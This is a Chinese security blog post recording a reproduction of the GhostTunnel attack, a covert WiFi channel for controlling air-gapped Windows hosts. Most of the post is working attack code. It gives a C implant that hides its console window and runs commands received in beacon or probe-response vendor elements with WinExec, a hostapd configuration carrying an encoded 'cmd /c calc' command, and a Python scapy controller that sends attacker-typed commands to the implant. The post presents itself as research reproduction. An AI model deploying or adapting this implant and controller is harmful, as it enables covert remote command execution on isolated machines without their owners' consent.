@@ -1,0 +1,481 @@
+# GhostTunne l 无线攻击简单复现记录
+
+阅读量 **234152**
+
+|评论 **1**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-07-04 11:00:25
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p4.ssl.qhimg.com/t01809c4ffa138b6f50.jpg)
+
+前段时间看到大佬们提到GhostTunnel，出于好奇心，打开搜索引擎了解一下。翻到关于GhostTunnel一篇文章，其中介绍的思路让人眼前一亮：[HITB议题-Ghost Tunnel攻击隔离网络的WiFi隐蔽传输通道](https://www.anquanke.com/post/id/107485#h3-1)
+
+## 0x01 什么是GhostTunnel
+
+这篇文章大致介绍了一种针对WIFI的物理隔离情况下，结合HID的攻击思路，并且命名为GhostTunnel攻击。  
+GhostTunnel的攻击实现效果：在目标主机上通过远程植入或者HID设备植入客户端的情况下，通过WLAN的Beacon、Probe
+Request和Probe
+Response握手协议，实现在无线信号范围内，攻击者对目标主机进行控制行为。并且目标主机的WLAN不会真正实现连接，具有较强的隐蔽性。
+
+这种攻击有以下这些优势：
+
+    
+    
+    HID设备只用于植入攻击代码，当植入完成就可以移除了。（HID攻击外的其他植入形式也是可以的）
+    
+    没有正常的网络连接，可以绕过防火墙。
+    
+    不会对现有的网络通信及连接状态造成影响。
+    
+    跨平台支持。该攻击可用于任何拥有WiFi模块的设备，我们在Win7、Win10、Mac OSX上进行了测试。
+    
+    可在几十米内工作，配合信号桥接设备理论上可做到无限远。
+    
+
+文章中给出了思路和原理、实战视频演示效果，并且给了公开的PPT，但是没有给出具体的细节和代码  
+搜索引擎相关只有一篇博客大致提供了参照：  
+[基于Ghost Tunnel的实践，实现Air
+Gapping环境下的通信与远程执行](https://blog.csdn.net/liu_si_yan/article/details/80268937)
+
+于是开始尝试进行实现（折腾），折腾的过程和大概如下：
+
+  1. 编写受害者端的程序，实现对网卡设备的监听和发送功能，监听指定SSID的Beacon和Probe Response帧，提取出携带的控制命令，发送Probe Request帧，进行被控端上线和命令执行结果的反馈。
+  2. 编写控制端程序，也是实现对网卡设备的监听和发送功能，监听发送过来的Probe Request帧，提取执行结果，发送携带要执行的指令的Beacon和Probe Response帧。
+  3. 通过Bad USB将被控端通过HID形式植入被攻击主机。（未完待续）
+
+折腾的结果都放在了Github上，有需要的小伙伴可以看看：
+
+<https://github.com/MRdoulestar/yunsle_ghost_tunnel>
+
+另外，和师兄的研究整合后，师兄的项目地址：
+
+<https://github.com/JcQSteven/GhostTunnel?from=timeline>
+
+## 0x02 Windows被控端
+
+被控端需要完成：  
+1、发送包含特定信息的Probe Request请求。  
+2、监听Beacon和Probe Response帧，提取命令进行执行，命令以ccc开头作为掩码。
+
+根据公开的PPT中介绍，选用了Windows的API来实现——Native WIFI API，其中主要涉及到的函数：
+
+    
+    
+    WlanOpenHandle                  打开Wlan的句柄
+    WlanEnumInterfaces              枚举网络设备
+    WlanScan                        发起ProbeRequest请求
+    WlanGetAvailableNetworkList     获取可用接入点
+    WlanGetNetworkBssList           获得Bss列表
+    
+
+所有相关API以及相关数据结构的介绍、使用可以查看：
+
+<https://msdn.microsoft.com/en-us/library/ms706274(v=vs.85).aspx>
+
+同时，需要做到控制台程序的隐蔽执行，控制程序在启动后需要将自身隐蔽起来，这里同样使用Windows的API来实现：
+
+    
+    
+    HWND hwnd;
+        hwnd = FindWindow(L"ConsoleWindowClass", NULL); //处理顶级窗口的类名和窗口名称匹配指定的字符串,不搜索子窗口。  
+        if (hwnd)
+        {
+            ShowWindow(hwnd, SW_HIDE);               //设置指定窗口的显示状态  
+        }
+    
+
+最后，这里直接贴出被控端主要代码的代码框架，我们使用”command ok!!!!!!.”作为被控端的特殊标记：
+
+    
+    
+    //payload数据结构
+    struct ie_data
+    {
+        unsigned char id;
+        unsigned char len;
+        unsigned char val[1];
+    };
+    int wmain()
+    {
+        HWND hwnd;
+        hwnd = FindWindow(L"ConsoleWindowClass", NULL); //处理顶级窗口的类名和窗口名称匹配指定的字符串,不搜索子窗口。  
+        if (hwnd)
+        {
+            ShowWindow(hwnd, SW_HIDE);               //设置指定窗口的显示状态  
+        }
+        // 申明初始化变量
+        HANDLE hClient = NULL;
+        DWORD dwMaxClient = 2;   //    
+        DWORD dwCurVersion = 0;
+        DWORD dwResult = 0;
+        int iRet = 0;
+        WCHAR GuidString[40] = { 0 };
+        int i;
+        /* variables used for WlanEnumInterfaces  */
+        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
+        PWLAN_INTERFACE_INFO pIfInfo = NULL;
+        //AVAILABLE属性
+        PWLAN_AVAILABLE_NETWORK_LIST pBssList = NULL;
+        PWLAN_AVAILABLE_NETWORK pBssEntry = NULL;
+        //添加的Bss属性
+        //PWLAN_BSS_ENTRY bss_entry = NULL;
+        int iRSSI = 0;
+        //封装payload
+        struct ie_data      *piedata = NULL;
+        int         response_len = 0;
+        char            *response = NULL;
+        //yunsle定义len和buf
+        int len = 18;
+        char *buf = "command ok!!!!!!.";
+    
+        response_len = sizeof(WLAN_RAW_DATA) - 1 + sizeof(struct ie_data) - 1 + len;
+        response = (char *)malloc(response_len);
+        memset(response, '', response_len);
+        //yunsle定义pwlan_data的类型为PWLAN_RAW_DATA
+        PWLAN_RAW_DATA pwlan_data = (PWLAN_RAW_DATA)response;
+        pwlan_data->dwDataSize = sizeof(struct ie_data) - 1 + len;
+        piedata = (struct ie_data *)&pwlan_data->DataBlob[0];
+        piedata->id = (char)221;
+        piedata->len = len;
+        //buf为要发送的数据（最大长度240），len为数据长度
+        memcpy(&piedata->val[0], buf, len);
+    
+        //循环接收命令
+        while (true) {
+    
+            //打开wlan句柄
+            dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
+            if (dwResult != ERROR_SUCCESS) {
+                ...........
+            }
+            //枚举wlan设备
+            dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
+            if (dwResult != ERROR_SUCCESS) {
+                ...........
+            }
+            else {
+                            ...........
+            }
+            //发送payload——————start
+            PDOT11_SSID pdo = new DOT11_SSID;
+            pdo->uSSIDLength = 19;
+            UCHAR *ucp = NULL;
+            ucp = (UCHAR *)&pdo->ucSSID;
+            ucp = (UCHAR *)malloc(pdo->uSSIDLength);
+            memset(ucp, '', pdo->uSSIDLength);
+            strcpy((char*)ucp, "yunsle_ghost_tunnel");
+            dwResult = WlanScan(hClient, &pIfInfo->InterfaceGuid, NULL, pwlan_data, NULL);
+            if (dwResult != ERROR_SUCCESS) {
+                ...........
+            }
+            else {
+                ...........
+            }
+            //发送payload——————end
+            free(pdo);
+    
+            //获取可用AP
+            dwResult = WlanGetAvailableNetworkList(hClient,
+                &pIfInfo->InterfaceGuid,
+                0,
+                NULL,
+                &pBssList);
+    
+            if (dwResult != ERROR_SUCCESS) {
+                 ...........
+            }
+            else {
+                ...........
+    
+                //这里如果j从0开始，会有重复SSID项，原因不明，但不是引起多次执行命令的原因
+                for (int j = (pBssList->dwNumberOfItems) / 2; j < pBssList->dwNumberOfItems; j++) {
+                    pBssEntry =
+                        (WLAN_AVAILABLE_NETWORK *)& pBssList->Network[j];
+                    //获得BSS的LIST
+                    //为了接收Probe Response帧，并解析出指令代码
+                    PWLAN_BSS_LIST ppWlanBssList;
+                    DWORD dwResult2 = WlanGetNetworkBssList(hClient, &pIfInfo->InterfaceGuid,
+                        &pBssEntry->dot11Ssid,
+                        pBssEntry->dot11BssType,
+                        pBssEntry->bSecurityEnabled,
+                        NULL,
+                        &ppWlanBssList);
+                    //错误处理
+                    if (dwResult2 != ERROR_SUCCESS) {
+                        ...........
+                    }
+    
+                    if (pBssEntry->dot11Ssid.uSSIDLength == 0)
+                        ...........
+                    else {
+                        //循环遍历AVAILABLE的BSSLisst数据
+                        for (int z = 0; z < ppWlanBssList->dwNumberOfItems; z++)
+                        {
+                            WLAN_BSS_ENTRY *bss_entry = &ppWlanBssList->wlanBssEntries[z];
+                            //添加判断是否来自控制端——yunsle_ghost_tunnel
+                            if (stricmp((char *)bss_entry->dot11Ssid.ucSSID, "yunsle_ghost_tunnel") == 0) {
+                                printf("找到控制端!n");
+                                char *pp = (char *)((unsigned long)bss_entry + bss_entry->ulIeOffset);
+                                int total_size = bss_entry->ulIeSize;
+                                //printf("长度：%d",total_size);
+                                for (;;) {
+                                    ie_data * ie = (struct ie_data *)pp;
+                                    if ((int)ie->id == 221)
+                                    {
+                                        //printf("221!!!!!n");
+                                        // eg. "ccccmd /c notepad"  
+                                        char *magic = (char *)&ie->val[0];
+                                        printf(magic);
+                                        printf("n");
+                                        if (strncmp(magic, "ccc", 3) == 0)
+                                        {
+                                            char command[240] = { 0 };
+                                            strncpy(command, magic + 3, ie->len - 3);
+                                            //执行命令
+                                            printf("提取命令：%sn",command);
+                                            WinExec(command, SW_NORMAL);
+                                            exit(1); //退出
+                                            break;
+                                        }
+                                    }
+                                    pp += sizeof(struct ie_data) - 1 + (int)ie->len;
+                                    total_size -= sizeof(struct ie_data) - 1 + (int)ie->len;
+                                    if  (!total_size)
+                                    {
+                                        break;  // over  
+                                    }
+    
+                                }
+                            }
+                        }
+    
+                //        wprintf(L"n");
+                    }
+    
+                }
+            }
+            //间隔
+            Sleep(3000);
+        }
+        if (pBssList != NULL) {
+            WlanFreeMemory(pBssList);
+            pBssList = NULL;
+        }
+    
+        if (pIfList != NULL) {
+            WlanFreeMemory(pIfList);
+            pIfList = NULL;
+        }
+        return 0;
+    }
+    
+
+## 0x03 GhostTunnel的控制端——Hostapd
+
+控制端程序要完成的功能：  
+1、监听Probe Request请求，监听到包含特殊标记”command ok!!!!!!.”的请求则进行处理。  
+2、将要执行的指令通过Probe Request或Beacon帧形式发送
+
+首先尝试使用Hostapd进行简单实现，Hostapd是一个Linux下将无线网卡作为热点提供Wifi的神器  
+在这里，它也能够作为控制端——可以发送添加自定义内容的Beacon帧
+
+需要注意，如果Ubuntu或者Kali碰到Hostapd开启失败的情况：
+
+    
+    
+    nl80211: Could not configure driver mode  
+    nl80211 driver initialization failed.  
+    hostapd_free_hapd_data: Interface wlan0 wasn't started
+    
+
+可以尝试以下命令解决：
+
+    
+    
+    #改变NetworkManager里的状态,关闭wifi，同时软锁定
+    nmcli nm wifi off
+    #启用wifi设备，不同于网络状态中的启用wifi(后者改变NetworkManager里的状态)
+    sudo rfkill unblock wlan
+    
+
+hostapd的配置文件——hostapd.conf:
+
+    
+    
+    interface=wlan0    监听wlan0设备
+    #driver=n180211    可以注释掉，自动选择
+    ssid=yunsle_ghost_tunnel   wifi的ssid名称
+    hw_mode=g    802.11/g模式
+    channel=1    信道1
+    auth_algs=1  
+    #附加数据，回应probe response
+    #dd是标识，0e是后面命令的长度，0e之后是ccccmd /c calc的16进制表示（CCC是掩码标识）
+    vendor_elements=dd0e636363636d64202f632063616c63
+    
+
+开启被控端后，执行hostapd -t hostapd.conf的效果：
+
+![](https://www.yourhome.ren/usr/uploads/2018/06/855760227.png)
+
+## 0x04 GhostTunnel的控制端——Python scapy
+
+使用hostapd终究不是自己定制化的，但是Linux下针对Wifi是较为复杂的C编程，同时又要查很多API  
+这时候想到Python的scapy库，之前用它作为抓包工具，印象中也可以构造很多类型的包进行发送，于是使用scapy开始尝试
+
+在这种解决方案下，需要手动开启无线网卡的混杂模式，这样才能通过scapy正常抓到802.11的所有包，开启无线网卡混杂模式的方法有很多:
+
+  1. 使用iwconfig，先ifconfig wlan0 down，然后iwconfig wlan0 mode monitor设置混杂模式，最后ifconfig wlan0 up即可。
+  2. 使用airodump-ng wlan0也可以直接将wlan0设置为混杂模式。
+
+Python使用scapy实现的功能逻辑很简单：  
+sniff函数监听wlan0上所有数据，包含特殊标记”command ok!!!!!!.”则提示输入执行的命令，最后发送响应到被控端。
+
+python代码如下(python2.7)：
+
+    
+    
+    #coding:utf-8
+    from scapy.all import *
+    import binascii
+    #设置ssid和监听设备名
+    netSSID = 'yunsle_ghost_tunnel'       #Network name here
+    iface = 'wlan0'         #Interface name here
+    #设置发送的帧数据
+    beacon = Dot11Beacon(cap='ESS+privacy')
+    essid = Dot11Elt(ID='SSID',info=netSSID, len=len(netSSID))
+    #处理控制函数
+    def handle(packet):
+        dot = packet.getlayer(Dot11)
+        if dot!=None and dot.type==0 and dot.subtype==4:
+            data=str(packet)
+            if data.find("command")>=0:
+                # packet.show()
+                print "#wake up#n"
+                #获取上线被控端的MAC地址
+                ct_addr2 = packet.addr2
+                #要执行的命令
+                cmd = raw_input("input the command to excute:n")
+                # cmd = "cmd /c notepad"
+                #处理命令编码
+                cmd_b = ""
+                for i in cmd:
+                    cmd_b += binascii.a2b_hex(hex(ord(i))[2:4])
+                print cmd_b
+                payload = Dot11Elt(ID=221, info=('x63x63x63'+cmd_b))
+                #beacon_dot11 = Dot11(type=0, subtype=5, addr1=ct_addr2,
+                #addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33')
+                response_dot11 = Dot11(subtype=5, addr1=ct_addr2,
+                addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33',SC=22222)
+                response_frame = RadioTap()/response_dot11/Dot11ProbeResp()/Dot11Elt(ID='SSID', info="yunsle_ghost_tunnel")/payload
+                #发送3次，每次300包
+                for i in range(0,3):
+                    sendp(response_frame, iface=iface, count=300)
+                exit(1)
+    if __name__ == "__main__":
+        print "waiting for wake up......."
+        #监听函数
+        sniff(iface=iface, prn=handle)
+    
+
+效果：
+
+![](https://www.yourhome.ren/usr/uploads/2018/06/2805300063.png)
+
+![](https://www.yourhome.ren/usr/uploads/2018/06/2557734645.png)
+
+![](https://www.yourhome.ren/usr/uploads/2018/06/802595481.png)
+
+* * *
+
+## 0x05 参考资料和过坑指南
+
+    
+    
+    https://msdn.microsoft.com/zh-cn/library/ms706716
+    WlanEnumInterfaces function函数介绍包括示例代码
+    
+    https://msdn.microsoft.com/en-us/library/ms706274(v=vs.85).aspx
+    Native Wifi Functions
+    
+    https://blog.csdn.net/liu_si_yan/article/details/80268937
+    基于Ghost Tunnel的实践，大概思路引导
+    
+    http://www.freebuf.com/articles/wireless/171108.html
+    freebuf上的源地址
+    
+    https://blog.csdn.net/qq_20448859/article/details/54131187
+    Hostapd在ubuntu下的安装
+    
+    https://blog.csdn.net/perry_peng/article/details/6067590
+    使用汇编使用Native Wifi API的大牛
+    
+    https://www.jianshu.com/p/c3a8abc8f329
+    Kali安装HostAPd
+    
+    https://blog.csdn.net/gsls200808/article/details/39370597
+    hostapd无法启动热点问题解决（非网卡不支持）
+    
+    https://zhoujianshi.github.io/articles/2016/%E6%9E%84%E9%80%A0%E5%B9%B6%E5%8F%91%E9%80%81Beacon%E5%B8%A7%E4%BB%A5%E4%BC%AA%E9%80%A0%E4%BB%BB%E6%84%8FWiFi%E7%83%AD%E7%82%B9/index.html
+    Linux下使用C写的发送Beacon帧
+    
+    https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
+    使用Python的scapy发送Beacon帧
+    
+    
+    
+    问题与解决：
+    nl80211: Could not configure driver mode  
+    nl80211 driver initialization failed.  
+    hostapd_free_hapd_data: Interface wlan0 wasn't started  
+    解决方法:
+    #改变NetworkManager里的状态,关闭wifi，同时软锁定
+    sudo nmcli nm wifi off   
+    #启用wifi设备，不同于网络状态中的启用wifi(后者改变NetworkManager里的状态)
+    sudo rfkill unblock wlan  
+    
+    # iw dev wlan0 interface add mon0 type monitor# ifconfig mon0 up
+    
+    直接使用airodump-ng wlan0时airodump-ng也会将wlan0设置为监听模式
+    
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **yunsle** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/150326](/post/id/150326)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [WiFi](/tag/WiFi)
+  * [技术分析](/tag/技术分析)
+  * [GhostTunne](/tag/GhostTunne)
+
+ **+1** __5赞
+
+ __收藏
+
+![](https://p3.ssl.qhimg.com/t018d078a0ca4861591.jpg) yunsle
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
